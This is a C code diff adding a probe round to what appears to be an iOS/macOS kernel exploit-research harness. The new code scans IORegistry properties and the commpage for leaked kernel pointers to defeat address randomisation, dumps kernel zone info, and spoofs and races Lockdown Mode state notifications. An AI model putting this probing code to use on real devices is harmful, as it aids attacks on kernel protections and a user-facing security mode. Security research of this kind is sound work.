@@ -4295,6 +4295,227 @@ static void r297_probe(void) {
  *   3. Try sel 0,1,16 with crafted input payloads
  *   4. Try trustd/securityd XPC to query entitlements and keybag state
  */
+static void r305_probe(void) {
+    rlog("\n=== r305: IORegistry Ptr Scan + Zone Info + LDM Notify + VM Region ===\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: IORegistry full tree walk for kernel pointers ---- */
+    rlog("--- Part 1: IORegistry property scan for kernel pointers ---\n");
+    {
+        io_iterator_t iter = IO_OBJECT_NULL;
+        kr = IORegistryCreateIterator(kIOMasterPortDefault,
+            kIOServicePlane, kIORegistryIterateRecursively, &iter);
+        rlog("  Registry iterator: kr=0x%x\n", kr);
+
+        int svc_count = 0, ptr_found = 0;
+        io_object_t entry;
+        while ((entry = IOIteratorNext(iter)) != IO_OBJECT_NULL && svc_count < 200) {
+            io_name_t name;
+            IORegistryEntryGetName(entry, name);
+
+            CFMutableDictionaryRef props = NULL;
+            kr = IORegistryEntryCreateCFProperties(entry, &props,
+                kCFAllocatorDefault, 0);
+            if (kr == KERN_SUCCESS && props) {
+                CFIndex count = CFDictionaryGetCount(props);
+                if (count > 0) {
+                    const void **keys = (const void**)malloc(sizeof(void*) * count);
+                    const void **vals = (const void**)malloc(sizeof(void*) * count);
+                    CFDictionaryGetKeysAndValues(props, keys, vals);
+
+                    for (CFIndex i = 0; i < count; i++) {
+                        if (CFGetTypeID(vals[i]) == CFDataGetTypeID()) {
+                            CFDataRef data = (CFDataRef)vals[i];
+                            CFIndex len = CFDataGetLength(data);
+                            if (len >= 8 && len <= 4096) {
+                                const uint8_t *bytes = CFDataGetBytePtr(data);
+                                for (CFIndex off = 0; off + 8 <= len; off += 4) {
+                                    uint64_t val;
+                                    memcpy(&val, bytes + off, 8);
+                                    if ((val >> 36) == 0xfffffff &&
+                                        (val & 0xFFF) == 0 &&
+                                        val != 0xfffffff000000000ULL) {
+                                        char keyStr[256] = {0};
+                                        if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                                            CFStringGetCString(keys[i], keyStr, sizeof(keyStr), kCFStringEncodingUTF8);
+                                        rlog("  ** KPTR: %s.%s off=%lld val=0x%llx **\n",
+                                             name, keyStr, (long long)off, val);
+                                        ptr_found++;
+                                    }
+                                }
+                            }
+                        }
+                        if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
+                            int64_t numVal = 0;
+                            CFNumberGetValue(vals[i], kCFNumberSInt64Type, &numVal);
+                            uint64_t uval = (uint64_t)numVal;
+                            if ((uval >> 36) == 0xfffffff && (uval & 0xFFF) == 0) {
+                                char keyStr[256] = {0};
+                                if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                                    CFStringGetCString(keys[i], keyStr, sizeof(keyStr), kCFStringEncodingUTF8);
+                                rlog("  ** KPTR NUM: %s.%s val=0x%llx **\n",
+                                     name, keyStr, uval);
+                                ptr_found++;
+                            }
+                        }
+                    }
+                    free(keys);
+                    free(vals);
+                }
+                CFRelease(props);
+            }
+            IOObjectRelease(entry);
+            svc_count++;
+        }
+        if (iter) IOObjectRelease(iter);
+        rlog("  Scanned %d services, found %d potential kernel pointers\n",
+             svc_count, ptr_found);
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: mach_zone_info / host_zone_info ---- */
+    rlog("\n--- Part 2: Kernel zone info ---\n");
+    {
+        mach_port_t host = mach_host_self();
+        mach_zone_name_t *names = NULL;
+        mach_zone_info_t *info = NULL;
+        mach_msg_type_number_t namesCnt = 0, infoCnt = 0;
+
+        kr = host_zone_info(host, &names, &namesCnt, &info, &infoCnt);
+        rlog("  host_zone_info: kr=0x%x namesCnt=%u infoCnt=%u\n",
+             kr, namesCnt, infoCnt);
+        if (kr == KERN_SUCCESS && namesCnt > 0) {
+            rlog("  Zones (first 20):\n");
+            for (unsigned i = 0; i < namesCnt && i < 20; i++) {
+                rlog("    %s: cur=%llu max=%llu elem=%llu\n",
+                     names[i].mzn_name,
+                     info[i].mzi_cur_size,
+                     info[i].mzi_max_size,
+                     info[i].mzi_elem_size);
+            }
+            /* Look for interesting zones */
+            for (unsigned i = 0; i < namesCnt; i++) {
+                if (strstr(names[i].mzn_name, "ipc") ||
+                    strstr(names[i].mzn_name, "task") ||
+                    strstr(names[i].mzn_name, "proc") ||
+                    strstr(names[i].mzn_name, "kalloc")) {
+                    rlog("    %s: cur=%llu max=%llu elem=%llu\n",
+                         names[i].mzn_name,
+                         info[i].mzi_cur_size,
+                         info[i].mzi_max_size,
+                         info[i].mzi_elem_size);
+                }
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)names,
+                namesCnt * sizeof(*names));
+            vm_deallocate(mach_task_self(), (vm_address_t)info,
+                infoCnt * sizeof(*info));
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: LDM notify_post race ---- */
+    rlog("\n--- Part 3: LDM notify_post + state check ---\n");
+    {
+        int token = 0;
+        uint64_t state = 0;
+        int rc = notify_register_check("com.apple.LockdownMode.stateDidChange", &token);
+        rlog("  register: rc=%d token=%d\n", rc, token);
+        rc = notify_get_state(token, &state);
+        rlog("  state before: %llu\n", state);
+
+        /* Post the notification to trigger LDM transition code */
+        rc = notify_post("com.apple.LockdownMode.stateDidChange");
+        rlog("  notify_post: rc=%d\n", rc);
+
+        /* Check state again */
+        rc = notify_get_state(token, &state);
+        rlog("  state after post: %llu\n", state);
+
+        /* Post with different state values */
+        rc = notify_set_state(token, 1);
+        rlog("  set_state(1): rc=%d\n", rc);
+        rc = notify_post("com.apple.LockdownMode.stateDidChange");
+        rlog("  notify_post after set: rc=%d\n", rc);
+        rc = notify_get_state(token, &state);
+        rlog("  state now: %llu\n", state);
+
+        /* Rapid toggle */
+        for (int i = 0; i < 10; i++) {
+            notify_set_state(token, i % 2);
+            notify_post("com.apple.LockdownMode.stateDidChange");
+        }
+        rc = notify_get_state(token, &state);
+        rlog("  state after rapid toggle: %llu\n", state);
+
+        notify_cancel(token);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: vm_region_recurse scan ---- */
+    rlog("\n--- Part 4: VM region scan for kernel-linked pages ---\n");
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t size = 0;
+        uint32_t depth = 0;
+        vm_region_submap_info_data_64_t info;
+        mach_msg_type_number_t count;
+
+        int region_count = 0;
+        int interesting = 0;
+        while (region_count < 500) {
+            count = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 100;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &size,
+                &depth, (vm_region_recurse_info_t)&info, &count);
+            if (kr != KERN_SUCCESS) break;
+
+            /* Look for unusual regions — kernel shared pages */
+            if (info.share_mode == SM_TRUESHARED ||
+                info.share_mode == SM_SHARED_ALIASED) {
+                if (addr > 0x100000000ULL && size < 0x10000) {
+                    rlog("  shared region: 0x%llx-0x%llx size=0x%llx share=%d prot=%d/%d obj=%u\n",
+                         addr, addr + size, size, info.share_mode,
+                         info.protection, info.max_protection, info.object_id);
+                    interesting++;
+                }
+            }
+            /* Commpage region (might reveal kernel slide) */
+            if (addr >= 0xFFFFFC000ULL && addr < 0x1000000000ULL) {
+                rlog("  high region: 0x%llx-0x%llx size=0x%llx prot=%d/%d\n",
+                     addr, addr + size, size,
+                     info.protection, info.max_protection);
+                /* Try to read first 64 bytes */
+                if (info.protection & VM_PROT_READ) {
+                    uint8_t *p = (uint8_t*)(uintptr_t)addr;
+                    rlog("    data: ");
+                    for (int i = 0; i < 64; i++)
+                        rlog("%02x", p[i]);
+                    rlog("\n");
+                    /* Scan for kernel pointers */
+                    for (int i = 0; i + 8 <= 4096; i += 4) {
+                        uint64_t v;
+                        memcpy(&v, p + i, 8);
+                        if ((v >> 36) == 0xfffffff) {
+                            rlog("    ** KPTR in commpage at +%d: 0x%llx **\n", i, v);
+                        }
+                    }
+                }
+            }
+
+            addr += size;
+            region_count++;
+        }
+        rlog("  Scanned %d regions, %d shared/interesting\n",
+             region_count, interesting);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r305 complete ===\n");
+    fflush(stdout);
+}
+
 static void r304_probe(void) {
     rlog("\n=== r304: AKS Notifications + Traps + Kernel Port Probes ===\n\n");
     fflush(stdout);
@@ -31479,6 +31700,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 305) {
+            rlog("*** rounds=305: IORegistry ptr scan + zone info + LDM notify + VM ***\n");
+            rlog("  r304: traps=sign-ext errors, all ports denied, AKS zeros.\n");
+            rlog("  Probe: full registry walk, zone info, notify_post LDM, vm scan.\n\n");
+            r305_probe();
             goto done;
         }
         if (rounds == 304) {
